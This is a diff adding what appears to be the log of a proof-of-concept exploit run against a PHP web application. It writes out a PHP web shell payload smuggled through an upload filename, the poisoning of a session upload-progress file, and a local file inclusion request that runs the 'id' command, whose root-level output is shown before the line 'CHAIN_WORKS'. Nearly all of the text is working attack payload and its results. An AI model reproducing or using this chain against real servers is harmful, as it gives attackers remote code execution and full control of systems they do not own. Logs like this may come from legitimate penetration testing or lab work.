@@ -1,0 +1,15 @@
+[poc] payload filename: b"<?php echo('RCEOUT=');system($_REQUEST[1]);?>"
+[poc] req1 upload -> HTTP 200 body=b'wp-upload/8.4.26 ready\nFILES: {"malware":"<?php echo(\'RCEOUT=\');system($_REQUEST[1]);?>"}\n'
+[poc] req2 include ?page=/wp-content.php?page=/tmp/sessions/sess_ph2svanilla600844&1=id -> HTTP 200 (417 bytes)
+--- body begin ---
+upload_progress_poc|a:5:{s:10:"start_time";i:1792600844;s:14:"content_length";i:287;s:15:"bytes_processed";i:287;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:7:"malware";s:4:"name";s:45:"RCEOUT=uid=0(root) gid=0(root) groups=0(root)
+";s:8:"tmp_name";s:27:"/tmp/phpkrlufbgdga4ga74Htst";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792600844;s:15:"bytes_processed";i:1;}}}
+--- end of include ---
+
+--- body end ---
+=== COMMAND OUTPUT ===
+RCEOUT=uid=0(root) gid=0(root) groups=0(root)
+";s:8:"tmp_name";s:27:"/tmp/phpkrlufbgdga4ga74Htst";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792600844;s:15:"bytes_processed";i:1;}}}
+--- end of include ---
+
+CHAIN_WORKS
